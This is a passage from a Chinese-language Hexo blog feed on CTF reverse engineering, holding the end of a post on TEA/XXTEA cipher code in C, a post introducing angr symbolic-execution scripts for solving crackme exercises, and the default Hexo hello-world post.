decipher(r, v, k);  </span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="xxtea"><strong>XXTEA</strong></h3><p><strong>又称Corrected Block TEA，是XTEA的升级版</strong> XXTEA是一个非平衡Feistel网络分组密码，在可变长度块上运行，这些块是32位大小的任意倍数（最小64位），使用128位密钥, 是目前TEA系列中最安全的算法，但性能较上两种有所降低。 <img src="2022-02-19-08-59-53mk-.png" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;stdint.h&gt;  </span><br><span class="line">#define DELTA 0x9e3779b9  </span><br><span class="line">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span><br><span class="line">  </span><br><span class="line">void btea(uint32_t *v, int n, uint32_t const key[4])  </span><br><span class="line">&#123;  </span><br><span class="line">    uint32_t y, z, sum;  </span><br><span class="line">    unsigned p, rounds, e;  </span><br><span class="line">    if (n &gt; 1)            /* Coding Part */  </span><br><span class="line">    &#123;  </span><br><span class="line">        rounds = 6 + 52/n;  </span><br><span class="line">        sum = 0;  </span><br><span class="line">        z = v[n-1];  </span><br><span class="line">        do  </span><br><span class="line">        &#123;  </span><br><span class="line">            sum += DELTA;  </span><br><span class="line">            e = (sum &gt;&gt; 2) &amp; 3;  </span><br><span class="line">            for (p=0; p&lt;n-1; p++)  </span><br><span class="line">            &#123;  </span><br><span class="line">                y = v[p+1];  </span><br><span class="line">                z = v[p] += MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            y = v[0];  </span><br><span class="line">            z = v[n-1] += MX;  </span><br><span class="line">        &#125;  </span><br><span class="line">        while (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">    else if (n &lt; -1)      /* Decoding Part */  </span><br><span class="line">    &#123;  </span><br><span class="line">        n = -n;  </span><br><span class="line">        rounds = 6 + 52/n;  </span><br><span class="line">        sum = rounds*DELTA;  </span><br><span class="line">        y = v[0];  </span><br><span class="line">        do  </span><br><span class="line">        &#123;  </span><br><span class="line">            e = (sum &gt;&gt; 2) &amp; 3;  </span><br><span class="line">            for (p=n-1; p&gt;0; p--)  </span><br><span class="line">            &#123;  </span><br><span class="line">                z = v[p-1];  </span><br><span class="line">                y = v[p] -= MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            z = v[n-1];  </span><br><span class="line">            y = v[0] -= MX;  </span><br><span class="line">            sum -= DELTA;  </span><br><span class="line">        &#125;  </span><br><span class="line">        while (--rounds);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">int main()  </span><br><span class="line">&#123;  </span><br><span class="line">    uint32_t v[2]= &#123;1,2&#125;;  </span><br><span class="line">    uint32_t const k[4]= &#123;2,2,3,4&#125;;  </span><br><span class="line">    int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密  </span><br><span class="line">    // v为要加密的数据是两个32位无符号整数  </span><br><span class="line">    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span><br><span class="line">    printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    btea(v, n, k);  </span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    btea(v, -n, k);  </span><br><span class="line">    printf(&quot;解密后的数据：%u %u\n&quot;,v[0],v[1]);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h4 id="注意">注意！</h4><p>python是大端序， 我们的C语言是小端序。所以需要转化一下。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python:</span><br><span class="line">b&#x27;\xbc\xa5\xce@\xf4\xb2\xb2\xe7\xa9\x12\x9d\x12\xae\x10\xc8[=\xd7\x06\x1d\xdcp\xf8\xdc&#x27;</span><br><span class="line">c++:</span><br><span class="line">uint32_t v[6]= &#123;0x40cea5bc,0xe7b2b2f4,0x129d12a9,0x5bc810ae,0x1d06d73d,0xdcf870dc&#125;; </span><br><span class="line">&quot;flag&quot; 0x67616c66 </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;tea&quot;&gt;&lt;strong&gt;TEA&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;感谢各位师傅，转载连接：https://www.cnblogs.com/sk2rw/p/14797633.html&lt;/p&gt;
&lt;p&gt;我做做删减和补充。&lt;/p&gt;
&lt;h3 id=&quot;简介&quot;&gt;简介&lt;/</summary>
      
    
    
    
    <category term="Reverse" scheme="https://feverhu.github.io/categories/Reverse/"/>
    
    
    <category term="TEA" scheme="https://feverhu.github.io/tags/TEA/"/>
    
  </entry>
  
  <entry>
    <title>angr学习</title>
    <link href="https://feverhu.github.io/2022/08/07/angr%E5%AD%A6%E4%B9%A0/"/>
    <id>https://feverhu.github.io/2022/08/07/angr%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-07T01:16:54.000Z</published>
    <updated>2022-09-16T12:59:53.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="angr学习"><strong>angr学习</strong></h1><h2 id="angr基本脚本"><strong>angr基本脚本</strong></h2><h3 id="一非命令行输入">一、非命令行输入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary = &quot;*****&quot;</span><br><span class="line">    project = angr.Project(path_to_binary, auto_load_libs=False)</span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    #一般我会先查看程序起始地址，64位程序可能是0x400000，32位可能是0x800000</span><br><span class="line">    #print(project.entry)</span><br><span class="line">    print_good_address = 0x4009E7 </span><br><span class="line">    simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">    if simulation.found:</span><br><span class="line">        solution_state = simulation.found[0]</span><br><span class="line">        solution = solution_state.posix.dumps(sys.stdin.fileno()) # 大概意思是dump出输入</span><br><span class="line">        print(solution)</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&#x27;Could not find the solution&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    Go()</span><br><span class="line">    #path_to_binary = &quot;oruga&quot;</span><br><span class="line">    #project = angr.Project(path_to_binary, auto_load_libs=False)</span><br><span class="line">    #print(project.entry)</span><br></pre></td></tr></table></figure><h3 id="二使用命令行参数情况">二、使用命令行参数情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary = &quot;chall&quot;</span><br><span class="line">    project = angr.Project(path_to_binary, auto_load_libs=False)</span><br><span class="line">    #print(project.entry)</span><br><span class="line">    argv1 = claripy.BVS(&#x27;argv1&#x27;,33*8)</span><br><span class="line">    initial_state = project.factory.entry_state(args=[&quot;./chall&quot;, argv1])</span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    print_good_address = 0x400817</span><br><span class="line">    simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">    if simulation.found:</span><br><span class="line">        solution_state = simulation.found[0].solver.eval(argv1)   # 打印结果</span><br><span class="line">        solution = solution_state.to_bytes(33,&quot;big&quot;)</span><br><span class="line">        print(solution)</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&#x27;Could not find the solution&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></figure><h3 id="代替scanf">代替scanf：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">import claripy</span><br><span class="line">def main(argv):</span><br><span class="line"></span><br><span class="line">  path_to_binary =  &#x27;ROR.exe&#x27; # :string</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  class ReplacementScanf(angr.SimProcedure):</span><br><span class="line">    def run(self, format_string, param0):</span><br><span class="line">      scanf0 = claripy.BVS(&#x27;scanf0&#x27;, 8 * 80)</span><br><span class="line">      scanf0_address = param0</span><br><span class="line">      print(scanf0_address)</span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness = project.arch.memory_endness)</span><br><span class="line">      self.state.globals[&#x27;solutions&#x27;] = scanf0</span><br><span class="line"></span><br><span class="line">  scanf_symbol = &#x27;scanf&#x27;</span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  def is_successful(state):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    return &#x27;Congratulations&#x27;.encode() in stdout_output</span><br><span class="line">  simulation.explore(find=is_successful)</span><br><span class="line"></span><br><span class="line">  if simulation.found:</span><br><span class="line"></span><br><span class="line">    solution_state = simulation.found[0]</span><br><span class="line">    stored_solutions = solution_state.globals[&#x27;solutions&#x27;]</span><br><span class="line">    scanf0_solution = solution_state.solver.eval(stored_solutions)</span><br><span class="line">    print(scanf0_solution)</span><br><span class="line"></span><br><span class="line">  else:</span><br><span class="line">    raise Exception(&#x27;Could not find the solution&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="angr练习十八道"><strong>angr练习十八道</strong></h2><h3 id="angr_find_condition">02_angr_find_condition</h3><p>本题知识点：在没有地址情况下，利用字符串来确定寻找地址和规避地址。</p><p>ida： <img src="2022-02-02-23-34-24mk-.png" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def is_successful(state):</span><br><span class="line">  # Dump whatever has been printed out by the binary so far into a string.</span><br><span class="line">  stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line">  # Return whether &#x27;Good Job.&#x27; has been printed yet.</span><br><span class="line">  # (!)</span><br><span class="line">  return b&#x27;Good Job.&#x27; in stdout_output  # :boolean</span><br><span class="line"></span><br><span class="line">def should_abort(state):</span><br><span class="line">  stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  return b&#x27;Try again.&#x27; in stdout_output  # :boolean</span><br><span class="line"></span><br><span class="line">simulation.explore(find=is_successful, avoid=should_abort)</span><br></pre></td></tr></table></figure><p>通过 <code>stdout_output = state.posix.dumps(sys.stdout.fileno())</code>和<code>return b'Good Job.' in stdout_output  # :boolean</code>来判断是否到底指定情况的地址，适用于多种情况而非一个地址的情况。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;angr学习&quot;&gt;&lt;strong&gt;angr学习&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&quot;angr基本脚本&quot;&gt;&lt;strong&gt;angr基本脚本&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;一非命令行输入&quot;&gt;一、非命令行输入&lt;/h3&gt;
&lt;figure clas</summary>
      
    
    
    
    <category term="Reverse" scheme="https://feverhu.github.io/categories/Reverse/"/>
    
    
    <category term="angr" scheme="https://feverhu.github.io/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://feverhu.github.io/2022/07/31/hello-world/"/>
    <id>https://feverhu.github.io/2022/07/31/hello-world/</id>
    <published>2022-07-31T06:56:59.204Z</published>
    <updated>2022-08-07T02:22:07.305Z</updated>
    
    <content type="html"><![CDATA[<p>感谢牛逼的hexo！自带的hello world就留着致敬吧！^_^</p><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;感谢牛逼的hexo！自带的hello world就留着致敬吧！^_^&lt;/p&gt;
&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;h</summary>
      
    
    
    
    
    <category term="tags" scheme="https://feverhu.github.io/tags/tags/"/>
    
  </entry>
  
</feed>
